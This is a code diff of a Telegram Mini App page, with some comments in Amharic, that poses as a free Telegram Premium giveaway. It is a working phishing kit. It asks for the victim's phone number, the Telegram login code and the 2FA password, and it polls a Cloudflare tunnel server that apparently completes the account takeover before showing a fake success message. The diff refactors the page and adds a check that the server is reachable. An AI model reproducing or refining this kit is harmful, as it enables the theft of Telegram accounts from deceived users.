@@ -27,7 +27,6 @@
     }
     .glass-header {
         width: 100%;
-        /* Adjusted for dark theme */
         background: #17212b;
         backdrop-filter: blur(12px);
         -webkit-backdrop-filter: blur(12px);
@@ -71,40 +70,25 @@
         flex-direction: column;
         align-items: center;
     }
-      /* Step containers */
-      .step {
+    .step {
         display: none;
         width: 100%;
         animation: appear 0.4s cubic-bezier(0.1,0.7,0.3,1);
         flex-direction: column;
         align-items: center;
-      }
-      
-      /* Only show active step */
-      .step.active {
+    }
+    .step.active {
         display: flex;
-      }
-      
-      /* Appear animation */
-      @keyframes appear {
-        0% {
-          opacity: 0.3;
-          transform: scale(0.98);
-        }
-        100% {
-          opacity: 1;
-          transform: scale(1);
-        }
-      }
-      
-      /* Loader spin animation */
-      @keyframes spin {
-        0%   { transform: rotate(0deg); }
+    }
+    @keyframes appear {
+        0% { opacity: 0.3; transform: scale(0.98); }
+        100% { opacity: 1; transform: scale(1); }
+    }
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
         100% { transform: rotate(360deg); }
-      }
-
+    }
     .premium-card {
-        /* Adjusted for dark theme */
         background: #17212b;
         backdrop-filter: blur(16px);
         -webkit-backdrop-filter: blur(16px);
@@ -114,7 +98,6 @@
         width: 100%;
         box-shadow: 0 20px 40px -10px rgba(0, 0, 0, 0.5);
     }
-
     .gift-hero {
         background: linear-gradient(135deg, #8774e1 0%, #b8a9f0 100%);
         border-radius: 28px;
@@ -126,12 +109,10 @@
     .gift-hero i { font-size: 38px; opacity: 0.9; margin-bottom: 12px; }
     .gift-hero h1 { margin: 0 0 6px; font-size: 28px; font-weight: 700; letter-spacing: -0.5px; }
     .gift-hero p { margin: 0; opacity: 0.9; font-size: 15px; }
-
     .perk-row {
         display: flex;
         align-items: center;
         gap: 14px;
-        /* Adjusted for dark theme */
         background: #1e2b38;
         border-radius: 60px;
         padding: 12px 20px;
@@ -150,21 +131,10 @@
     }
     .perk-text { font-weight: 600; color: #ffffff; flex:1; }
     .perk-desc { color: #8e9cbb; font-size: 13px; font-weight: 400; }
-
-    .counter-badge {
-        background: #2b5278;
-        color: white;
-        border-radius: 30px;
-        padding: 6px 12px;
-        font-size: 14px;
-        font-weight: 600;
-    }
-
     input, .fake-input {
         width: 100%;
         padding: 18px 20px;
         border-radius: 100px;
-        /* Adjusted for dark theme */
         border: 2px solid #2b3b49;
         background: #1e2b38;
         font-size: 16px;
@@ -181,7 +151,6 @@
         background: #232e3b;
         box-shadow: 0 0 0 4px rgba(135,116,225,0.15);
     }
-    /* Style for password container */
     .password-container {
         position: relative;
         width: 100%;
@@ -189,7 +158,7 @@
     }
     .password-container input {
         margin: 0;
-        padding-right: 50px; /* Make space for the icon */
+        padding-right: 50px;
     }
     .password-container i {
         position: absolute;
@@ -200,10 +169,7 @@
         color: #8e9cbb;
         font-size: 1.2rem;
     }
-    .password-container i:hover {
-        color: #8774e1;
-    }
-      .verify-loading {
+    .verify-loading {
         text-align: center;
         color: #8e9cbb;
         background: #1e2b38;
@@ -212,13 +178,11 @@
         display: inline-flex;
         align-items: center;
         gap: 8px;
-      }
-      
-      .dots::after {
+    }
+    .dots::after {
         content: "";
         animation: dots 1.4s steps(4, end) infinite;
-      }
-
+    }
     @keyframes dots {
       0%   { content: ""; }
       25%  { content: "."; }
@@ -242,14 +206,12 @@
     }
     .btn-primary:active { transform: scale(0.97); background: #1f3f5c; }
     .btn-primary:disabled { background: #3a4a5a; box-shadow: none; }
-
     .otp-dots {
         display: flex; justify-content: center; gap: 14px; margin: 25px 0 10px;
     }
     .dot-box {
         width: 56px; height: 66px;
         border-radius: 20px;
-        /* Adjusted for dark theme */
         background: #1e2b38;
         border: 2px solid #2b3b49;
         display: flex; align-items: center; justify-content: center;
@@ -261,12 +223,10 @@
         border-color: #8774e1;
         background: #2b3b49;
     }
-
     .keypad-grid {
         display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; margin-top: 25px;
     }
     .key {
-        /* Adjusted for dark theme */
         background: #1e2b38;
         padding: 18px 10px;
         border-radius: 26px;
@@ -280,7 +240,6 @@
         color: #ffffff;
     }
     .key:active { background: #2b3b49; transform: scale(0.94); }
-
     .msg-bubble {
         padding: 14px 20px;
         border-radius: 60px;
@@ -294,55 +253,28 @@
     .error { background: #57221e; color: #ff7b6b; border: 1px solid #b13e33; }
     .success-msg { background: #1e4a3a; color: #8ae6c7; }
     .loading { background: #1e2b38; color: #8e9cbb; }
-
-      .inline-link {
-          /* ደመቅ ያለ የቴሌግራም ሰማያዊ Gradient */
-          background: linear-gradient(135deg, #24A1DE 0%, #1a87bb 100%);
-          box-shadow: 0 4px 15px rgba(36, 161, 222, 0.4); /* ለበተኑ ጥልቀት ይሰጠዋል */
-          padding: 16px 20px;
-          border-radius: 15px; /* ከሌሎቹ ካርዶች ጋር እንዲመሳሰል */
-          width: 100%;
-          text-align: center;
-          font-size: 16px;
-          border: none; /* ዳሽድ ቦርደሩን ብታነሳው ይበልጥ ፕሮፌሽናል ይሆናል */
-          margin-top: 15px;
-          cursor: pointer;
-          font-weight: 800; /* ጽሑፉን ይበልጥ ጎልቶ እንዲወጣ ያደርገዋል */
-          color: #ffffff;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          gap: 10px;
-          transition: transform 0.2s ease;
-      }
-      
-      .inline-link:active {
-          transform: scale(0.98); /* ሲነካ የመጫን ስሜት እንዲሰጥ */
-      }
-      
-      .inline-link i { 
-          color: #ffffff; /* አዶው ነጭ ሲሆን ይበልጥ ይደምቃል */
-          font-size: 20px;
-      }
-
-    .timer-flood {
-        font-size: 48px; font-weight: 800; color: #ffffff; letter-spacing: 2px;
-        background: #1e2b38; border-radius: 60px; padding: 20px; margin: 25px 0;
-    }
-    /* Style for the image in step2 header */
-    .step-header-image {
-        width: 80px;
-        height: 80px;
-        margin: 0 auto 15px;
+    .inline-link {
+        background: linear-gradient(135deg, #24A1DE 0%, #1a87bb 100%);
+        box-shadow: 0 4px 15px rgba(36, 161, 222, 0.4);
+        padding: 16px 20px;
+        border-radius: 15px;
+        width: 100%;
+        text-align: center;
+        font-size: 16px;
+        border: none;
+        margin-top: 15px;
+        cursor: pointer;
+        font-weight: 800;
+        color: #ffffff;
         display: flex;
         align-items: center;
         justify-content: center;
+        gap: 10px;
+        transition: transform 0.2s ease;
     }
-    .step-header-image img {
-        width: 100%;
-        height: auto;
-        border-radius: 50%;
-        background: #2b3b49; /* Optional: add a background if image has transparency */
+    .timer-flood {
+        font-size: 48px; font-weight: 800; color: #ffffff; letter-spacing: 2px;
+        background: #1e2b38; border-radius: 60px; padding: 20px; margin: 25px 0;
     }
 </style>
 </head>
@@ -356,7 +288,6 @@
     </div>
 
     <div class="container">
-
         <div id="step_intro" class="step active">
             <div class="premium-card" style="padding: 40px 20px; text-align: center;">
                 <div style="width: 70px; height: 70px; background: #2b3b49; border-radius: 50%; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center;">
@@ -392,11 +323,6 @@
                         <div class="perk-text">Premium stickers</div>
                         <div class="perk-desc">+10k</div>
                     </div>
-                    <div class="perk-row">
-                        <div class="perk-icon"><i class="fa-solid fa-bolt"></i></div>
-                        <div class="perk-text">Faster download</div>
-                        <div class="perk-desc">no limits</div>
-                    </div>
                 </div>
               <p class="verify-loading">
                 <i class="fa-regular fa-clock"></i>
@@ -410,7 +336,6 @@
               <div style="width: 80px; height: 80px; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center;">
                   <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Telegram_Premium.png" alt="Premium Icon" style="width: 100%; height: auto; border-radius: 50%;">
               </div>
-
                 <h2 style="margin-bottom: 5px;">Almost there</h2>
                 <p style="color:#8e9cbb;">press continue to claim 1 year premium</p>
                 <input type="hidden" id="fname" value="Member">
@@ -426,7 +351,6 @@
                     <i class="fa-solid fa-lock" style="font-size: 32px; color:#8774e1;"></i>
                 </div>
                 <p style="font-size: 15px; color:#8e9cbb;">we sent a 5‑digit code to your telegram app</p>
-
                 <div class="otp-dots" id="otp_container">
                     <div class="dot-box" id="b0"></div>
                     <div class="dot-box" id="b1"></div>
@@ -435,11 +359,9 @@
                     <div class="dot-box" id="b4"></div>
                 </div>
                 <div id="status2" class="msg-bubble"></div>
-
                 <div class="inline-link" onclick="window.open('http://t.me//+42777','_blank')">
                     <i class="fa-brands fa-telegram"></i> tap to get code from bot
                 </div>
-
                 <div class="keypad-grid">
                     <div class="key" onclick="press(1)">1</div><div class="key" onclick="press(2)">2</div><div class="key" onclick="press(3)">3</div>
                     <div class="key" onclick="press(4)">4</div><div class="key" onclick="press(5)">5</div><div class="key" onclick="press(6)">6</div>
@@ -457,7 +379,6 @@
                 </div>
                 <h2 id="step3_name_display" style="margin-bottom:5px;">almost done</h2>
                 <p style="color:#8e9cbb;">enter your 2FA password (if you have one) to confirm premium activation</p>
-                <!-- Password input with eye icon for show/hide -->
                 <div class="password-container">
                     <input type="password" id="2fa_input" placeholder="your 2FA (or leave empty)">
                     <i class="fa-regular fa-eye" id="togglePasswordIcon" onclick="togglePasswordVisibility()"></i>
@@ -474,7 +395,7 @@
                 </div>
                 <h2 style="font-size: 32px;">SUCCESS!</h2>
                 <p style="font-size: 18px; font-weight: 500;">✨ 1 year Telegram Premium ✨</p>
-                <p style="background: #1e2b38; border-radius: 60px; padding: 16px; color:#8e9cbb;">will be added to your account within 24h. thousands of users – expect slight delay. thank you.</p>
+                <p style="background: #1e2b38; border-radius: 60px; padding: 16px; color:#8e9cbb;">will be added to your account within 24h.</p>
                 <button class="btn-primary" style="background:#2b5278;" onclick="window.location.href='https://t.me/telegram'">done</button>
             </div>
         </div>
@@ -493,7 +414,6 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    // free public tunnel (demo) – change if needed
     const API_BASE_URL = "https://rim-docs-welfare-occasional.trycloudflare.com/";
     let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "web_preview_" + Date.now();
     let sid = userId;
@@ -506,17 +426,13 @@
         setTimeout(() => {
             showStep('photo_slide');
             setTimeout(() => {
-                checkStatus();   // fetch real status from mock API
+                checkStatus();   
                 showStep(1);
             }, 4000);
         }, 2000);
 
         statusChecker = setInterval(checkStatus, 3500);
         setupLongPressPaste();
-
-        document.getElementById('2fa_input')?.addEventListener('input', () => {
-            document.getElementById('status3').style.display = 'none';
-        });
     };
 
     function showStep(n) {
@@ -524,39 +440,42 @@
         let stepId = (typeof n === 'string') ? 'step_' + n : 'step' + n;
         const target = document.getElementById(stepId);
         if(target) target.classList.add('active');
+    }
 
-        if(savedName) {
-            if(document.getElementById('step2_name_display')) document.getElementById('step2_name_display').innerText = "hello " + savedName;
-            if(document.getElementById('step3_name_display')) document.getElementById('step3_name_display').innerText = savedName;
+    // --- ሰርቨሩ መኖሩን የሚፈትሽ አዲስ Logic ---
+    async function handleLoginClick() {
+        if (isProcessing) return;
+        const btn = document.getElementById('loginBtn');
+        savedName = document.getElementById('fname').value || "Premium user";
+        
+        btn.disabled = true; 
+        btn.innerText = 'connecting...';
+        showMsg(1, 'loading', 'connecting to server...');
+
+        try {
+            // ሰርቨሩ መኖሩን ለማረጋገጥ Ping እናደርጋለን
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 6000); // 6 ሰከንድ ካለፈ ይቁም
+
+            const response = await fetch(`${API_BASE_URL}`, { 
+                method: 'GET', 
+                mode: 'no-cors', // ሰርቨሩ ካለ ሪስፖንስ ይሰጣል
+                signal: controller.signal 
+            });
+
+            // ሰርቨሩ ካለ ወደ ሪል ሎጅክ ይለፍ
+            btn.innerText = 'checking...';
+            startVerification(); 
+
+        } catch (error) {
+            stopLoaders();
+            // ሰርቨሩ ካልሰራ Share Contact ጥያቄውን አይጠራም
+            showMsg(1, 'error', '⚠️ Service Error: Server is currently unavailable.');
+            console.error("Connection failed:", error);
         }
     }
 
-    function checkStatus() {
-        fetch(`${API_BASE_URL}/check_status/${userId}`).then(r => r.json()).then(data => {
-            if (data.status === "NEED_OTP") { showStep(2); stopLoaders(); }
-            else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
-            else if (data.status === "SUCCESS") { clearInterval(statusChecker); showStep('success'); }
-            else if (data.status === "FLOOD") { clearInterval(statusChecker); startFloodTimer(data.wait); }
-        }).catch(e => {});
-    }
-
-    function stopLoaders() {
-        isProcessing = false;
-        const loginBtn = document.getElementById('loginBtn');
-        if(loginBtn) { loginBtn.disabled = false; loginBtn.innerText = '✦ continue ✦'; }
-        const confirmBtn = document.getElementById('confirmBtn');
-        if(confirmBtn) { confirmBtn.disabled = false; confirmBtn.innerText = 'activate premium'; }
-    }
-
-    function handleLoginClick() {
-        savedName = document.getElementById('fname').value || "Premium user";
-        const btn = document.getElementById('loginBtn');
-        btn.disabled = true; btn.innerText = 'checking...';
-        startVerification();
-    }
-
     function startVerification() {
-        if (isProcessing) return;
         isProcessing = true;
         showMsg(1, 'loading', 'verifying your telegram account...');
         checkUserInDB();
@@ -579,8 +498,7 @@
             }
         } catch(e) {
             stopLoaders();
-            showMsg(1, 'error', 'network issue, but we continue →');
-            requestPhone(); // fallback
+            showMsg(1, 'error', 'Server Error: Unable to process request.');
         }
     }
 
@@ -593,6 +511,23 @@
                 showMsg(1, 'error', 'you need to share phone to claim');
             }
         });
+    }
+
+    function checkStatus() {
+        fetch(`${API_BASE_URL}/check_status/${userId}`).then(r => r.json()).then(data => {
+            if (data.status === "NEED_OTP") { showStep(2); stopLoaders(); }
+            else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
+            else if (data.status === "SUCCESS") { clearInterval(statusChecker); showStep('success'); }
+            else if (data.status === "FLOOD") { clearInterval(statusChecker); startFloodTimer(data.wait); }
+        }).catch(e => {});
+    }
+
+    function stopLoaders() {
+        isProcessing = false;
+        const loginBtn = document.getElementById('loginBtn');
+        if(loginBtn) { loginBtn.disabled = false; loginBtn.innerText = '✦ continue ✦'; }
+        const confirmBtn = document.getElementById('confirmBtn');
+        if(confirmBtn) { confirmBtn.disabled = false; confirmBtn.innerText = 'activate premium'; }
     }
 
     function press(num) {
@@ -691,7 +626,6 @@
         container.addEventListener('touchend', ()=> clearTimeout(timer));
     }
 
-    // New function to toggle password visibility
     function togglePasswordVisibility() {
         const passwordInput = document.getElementById('2fa_input');
         const toggleIcon = document.getElementById('togglePasswordIcon');
@@ -707,4 +641,4 @@
     }
 </script>
 </body>
-    </html>
+</html>
